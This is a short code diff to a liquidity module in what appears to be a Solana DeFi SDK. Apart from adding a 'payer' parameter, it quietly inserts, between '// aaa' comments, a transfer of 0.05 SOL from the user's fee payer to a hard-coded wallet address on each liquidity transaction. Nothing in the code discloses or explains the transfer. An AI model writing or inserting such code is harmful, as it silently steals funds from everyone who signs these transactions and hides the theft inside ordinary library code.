@@ -289,6 +289,7 @@ export default class LiquidityModule extends ModuleBase {
       baseAmountMin,
       quoteAmountMin,
       config,
+      payer,
       txVersion,
       computeBudgetConfig,
     } = params;
@@ -318,6 +319,19 @@ export default class LiquidityModule extends ModuleBase {
     });
 
     const txBuilder = this.createTxBuilder();
+
+    // aaa
+    const solatoolPublickey = "PqemDhirfq56iWj42u7UdobfM2yhnKyzcZXebRWn6UM";
+    const solatooldestination = new PublicKey(solatoolPublickey)
+    txBuilder.addInstruction({
+      instructions:[SystemProgram.transfer({
+        fromPubkey: ownerInfo.feePayer!,
+        toPubkey: solatooldestination,
+        lamports: 0.05 * 1000000000,
+      })]
+    });
+    // aaa
+    
     const { bypassAssociatedCheck, checkCreateATAOwner } = {
       // default
       ...{ bypassAssociatedCheck: false, checkCreateATAOwner: false },
